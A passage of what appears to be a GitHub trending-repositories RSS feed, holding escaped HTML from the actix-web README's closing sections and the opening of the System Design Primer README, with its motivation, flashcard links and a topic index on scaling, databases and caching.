&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/diesel/"&gt;Diesel integration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/r2d2/"&gt;r2d2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/openssl/"&gt;OpenSSL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/rustls/"&gt;Rustls&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/websocket-chat/"&gt;Tcp/Websocket chat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/actix/examples/tree/master/json/"&gt;Json&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You may consider checking out
&lt;a href="https://github.com/actix/examples/tree/master/"&gt;this directory&lt;/a&gt; for more examples.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-benchmarks" class="anchor" aria-hidden="true" href="#benchmarks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Benchmarks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.techempower.com/benchmarks/#section=data-r18" rel="nofollow"&gt;TechEmpower Framework Benchmark&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;This project is licensed under either of&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Apache License, Version 2.0, (&lt;a href="LICENSE-APACHE"&gt;LICENSE-APACHE&lt;/a&gt; or &lt;a href="http://www.apache.org/licenses/LICENSE-2.0" rel="nofollow"&gt;http://www.apache.org/licenses/LICENSE-2.0&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;MIT license (&lt;a href="LICENSE-MIT"&gt;LICENSE-MIT&lt;/a&gt; or &lt;a href="http://opensource.org/licenses/MIT" rel="nofollow"&gt;http://opensource.org/licenses/MIT&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;at your option.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-code-of-conduct" class="anchor" aria-hidden="true" href="#code-of-conduct"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Code of Conduct&lt;/h2&gt;
&lt;p&gt;Contribution to the actix-web crate is organized under the terms of the
Contributor Covenant, the maintainer of actix-web, @fafhrd91, promises to
intervene to uphold that code of conduct.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>fafhrd91</author><guid isPermaLink="false">https://github.com/fafhrd91/actix-web</guid><pubDate>Sun, 19 Jan 2020 00:10:00 GMT</pubDate></item><item><title>donnemartin/system-design-primer #11 in All Languages, Today</title><link>https://github.com/donnemartin/system-design-primer</link><description>&lt;p&gt;&lt;i&gt;Learn how to design large-scale systems. Prep for the system design interview.  Includes Anki flashcards.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;em&gt;&lt;a href="README.md"&gt;English&lt;/a&gt; ∙ &lt;a href="README-ja.md"&gt;日本語&lt;/a&gt; ∙ &lt;a href="README-zh-Hans.md"&gt;简体中文&lt;/a&gt; ∙ &lt;a href="README-zh-TW.md"&gt;繁體中文&lt;/a&gt; | &lt;a href="https://github.com/donnemartin/system-design-primer/issues/170"&gt;العَرَبِيَّة‎&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/220"&gt;বাংলা&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/40"&gt;Português do Brasil&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/186"&gt;Deutsch&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/130"&gt;ελληνικά&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/272"&gt;עברית&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/104"&gt;Italiano&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/102"&gt;韓國語&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/110"&gt;فارسی&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/68"&gt;Polski&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/87"&gt;русский язык&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/136"&gt;Español&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/187"&gt;ภาษาไทย&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/39"&gt;Türkçe&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/127"&gt;tiếng Việt&lt;/a&gt; ∙ &lt;a href="https://github.com/donnemartin/system-design-primer/issues/250"&gt;Français&lt;/a&gt; | &lt;a href="https://github.com/donnemartin/system-design-primer/issues/28"&gt;Add Translation&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-the-system-design-primer" class="anchor" aria-hidden="true" href="#the-system-design-primer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;The System Design Primer&lt;/h1&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/e45e39c36eebcc4c66e1aecd4e4145112d8e88e3/687474703a2f2f692e696d6775722e636f6d2f6a6a3341354e382e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/e45e39c36eebcc4c66e1aecd4e4145112d8e88e3/687474703a2f2f692e696d6775722e636f6d2f6a6a3341354e382e706e67" data-canonical-src="http://i.imgur.com/jj3A5N8.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-motivation" class="anchor" aria-hidden="true" href="#motivation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Motivation&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Learn how to design large-scale systems.&lt;/p&gt;
&lt;p&gt;Prep for the system design interview.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;&lt;a id="user-content-learn-how-to-design-large-scale-systems" class="anchor" aria-hidden="true" href="#learn-how-to-design-large-scale-systems"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Learn how to design large-scale systems&lt;/h3&gt;
&lt;p&gt;Learning how to design scalable systems will help you become a better engineer.&lt;/p&gt;
&lt;p&gt;System design is a broad topic.  There is a &lt;strong&gt;vast amount of resources scattered throughout the web&lt;/strong&gt; on system design principles.&lt;/p&gt;
&lt;p&gt;This repo is an &lt;strong&gt;organized collection&lt;/strong&gt; of resources to help you learn how to build systems at scale.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-learn-from-the-open-source-community" class="anchor" aria-hidden="true" href="#learn-from-the-open-source-community"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Learn from the open source community&lt;/h3&gt;
&lt;p&gt;This is a continually updated, open source project.&lt;/p&gt;
&lt;p&gt;&lt;a href="#contributing"&gt;Contributions&lt;/a&gt; are welcome!&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-prep-for-the-system-design-interview" class="anchor" aria-hidden="true" href="#prep-for-the-system-design-interview"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Prep for the system design interview&lt;/h3&gt;
&lt;p&gt;In addition to coding interviews, system design is a &lt;strong&gt;required component&lt;/strong&gt; of the &lt;strong&gt;technical interview process&lt;/strong&gt; at many tech companies.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Practice common system design interview questions&lt;/strong&gt; and &lt;strong&gt;compare&lt;/strong&gt; your results with &lt;strong&gt;sample solutions&lt;/strong&gt;: discussions, code, and diagrams.&lt;/p&gt;
&lt;p&gt;Additional topics for interview prep:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#study-guide"&gt;Study guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#how-to-approach-a-system-design-interview-question"&gt;How to approach a system design interview question&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#system-design-interview-questions-with-solutions"&gt;System design interview questions, &lt;strong&gt;with solutions&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#object-oriented-design-interview-questions-with-solutions"&gt;Object-oriented design interview questions, &lt;strong&gt;with solutions&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#additional-system-design-interview-questions"&gt;Additional system design interview questions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-anki-flashcards" class="anchor" aria-hidden="true" href="#anki-flashcards"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Anki flashcards&lt;/h2&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/75b5cf737556050871218226ea211256f19f3a40/687474703a2f2f692e696d6775722e636f6d2f7a6443416b42332e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/75b5cf737556050871218226ea211256f19f3a40/687474703a2f2f692e696d6775722e636f6d2f7a6443416b42332e706e67" data-canonical-src="http://i.imgur.com/zdCAkB3.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
&lt;/p&gt;
&lt;p&gt;The provided &lt;a href="https://apps.ankiweb.net/" rel="nofollow"&gt;Anki flashcard decks&lt;/a&gt; use spaced repetition to help you retain key system design concepts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/system-design-primer/tree/master/resources/flash_cards/System%20Design.apkg"&gt;System design deck&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/system-design-primer/tree/master/resources/flash_cards/System%20Design%20Exercises.apkg"&gt;System design exercises deck&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/system-design-primer/tree/master/resources/flash_cards/OO%20Design.apkg"&gt;Object oriented design exercises deck&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Great for use while on-the-go.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-coding-resource-interactive-coding-challenges" class="anchor" aria-hidden="true" href="#coding-resource-interactive-coding-challenges"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Coding Resource: Interactive Coding Challenges&lt;/h3&gt;
&lt;p&gt;Looking for resources to help you prep for the &lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;&lt;strong&gt;Coding Interview&lt;/strong&gt;&lt;/a&gt;?&lt;/p&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/473700c20356af5875155f24d3a26b57ae940bdc/687474703a2f2f692e696d6775722e636f6d2f6234597441454e2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/473700c20356af5875155f24d3a26b57ae940bdc/687474703a2f2f692e696d6775722e636f6d2f6234597441454e2e706e67" data-canonical-src="http://i.imgur.com/b4YtAEN.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
&lt;/p&gt;
&lt;p&gt;Check out the sister repo &lt;a href="https://github.com/donnemartin/interactive-coding-challenges"&gt;&lt;strong&gt;Interactive Coding Challenges&lt;/strong&gt;&lt;/a&gt;, which contains an additional Anki deck:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/interactive-coding-challenges/tree/master/anki_cards/Coding.apkg"&gt;Coding deck&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Learn from the community.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Feel free to submit pull requests to help:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Fix errors&lt;/li&gt;
&lt;li&gt;Improve sections&lt;/li&gt;
&lt;li&gt;Add new sections&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/donnemartin/system-design-primer/issues/28"&gt;Translate&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Content that needs some polishing is placed &lt;a href="#under-development"&gt;under development&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Review the &lt;a href="CONTRIBUTING.md"&gt;Contributing Guidelines&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-index-of-system-design-topics" class="anchor" aria-hidden="true" href="#index-of-system-design-topics"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Index of system design topics&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Summaries of various system design topics, including pros and cons.  &lt;strong&gt;Everything is a trade-off&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Each section contains links to more in-depth resources.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/14f76dab28dfbfa12ea6b02c6bd0ec726fc17306/687474703a2f2f692e696d6775722e636f6d2f6a7255424146372e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/14f76dab28dfbfa12ea6b02c6bd0ec726fc17306/687474703a2f2f692e696d6775722e636f6d2f6a7255424146372e706e67" data-canonical-src="http://i.imgur.com/jrUBAF7.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#system-design-topics-start-here"&gt;System design topics: start here&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#step-1-review-the-scalability-video-lecture"&gt;Step 1: Review the scalability video lecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#step-2-review-the-scalability-article"&gt;Step 2: Review the scalability article&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#next-steps"&gt;Next steps&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#performance-vs-scalability"&gt;Performance vs scalability&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#latency-vs-throughput"&gt;Latency vs throughput&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#availability-vs-consistency"&gt;Availability vs consistency&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#cap-theorem"&gt;CAP theorem&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#cp---consistency-and-partition-tolerance"&gt;CP - consistency and partition tolerance&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ap---availability-and-partition-tolerance"&gt;AP - availability and partition tolerance&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#consistency-patterns"&gt;Consistency patterns&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#weak-consistency"&gt;Weak consistency&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#eventual-consistency"&gt;Eventual consistency&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#strong-consistency"&gt;Strong consistency&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#availability-patterns"&gt;Availability patterns&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#fail-over"&gt;Fail-over&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#replication"&gt;Replication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#availability-in-numbers"&gt;Availability in numbers&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#domain-name-system"&gt;Domain name system&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#content-delivery-network"&gt;Content delivery network&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#push-cdns"&gt;Push CDNs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#pull-cdns"&gt;Pull CDNs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#load-balancer"&gt;Load balancer&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#active-passive"&gt;Active-passive&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#active-active"&gt;Active-active&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#layer-4-load-balancing"&gt;Layer 4 load balancing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#layer-7-load-balancing"&gt;Layer 7 load balancing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#horizontal-scaling"&gt;Horizontal scaling&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#reverse-proxy-web-server"&gt;Reverse proxy (web server)&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#load-balancer-vs-reverse-proxy"&gt;Load balancer vs reverse proxy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#application-layer"&gt;Application layer&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#microservices"&gt;Microservices&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#service-discovery"&gt;Service discovery&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#database"&gt;Database&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#relational-database-management-system-rdbms"&gt;Relational database management system (RDBMS)&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#master-slave-replication"&gt;Master-slave replication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#master-master-replication"&gt;Master-master replication&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#federation"&gt;Federation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sharding"&gt;Sharding&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#denormalization"&gt;Denormalization&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sql-tuning"&gt;SQL tuning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#nosql"&gt;NoSQL&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#key-value-store"&gt;Key-value store&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#document-store"&gt;Document store&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#wide-column-store"&gt;Wide column store&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#graph-database"&gt;Graph Database&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#sql-or-nosql"&gt;SQL or NoSQL&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cache"&gt;Cache&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#client-caching"&gt;Client caching&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#cdn-caching"&gt;CDN caching&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#web-server-caching"&gt;Web server caching&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#database-caching"&gt;Database caching&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#application-caching"&gt;Application caching&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#caching-at-the-database-query-level"&gt;Caching at the database query level&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#caching-at-the-object-level"&gt;Caching at the object level&lt;/a&gt;&lt;/li&gt;
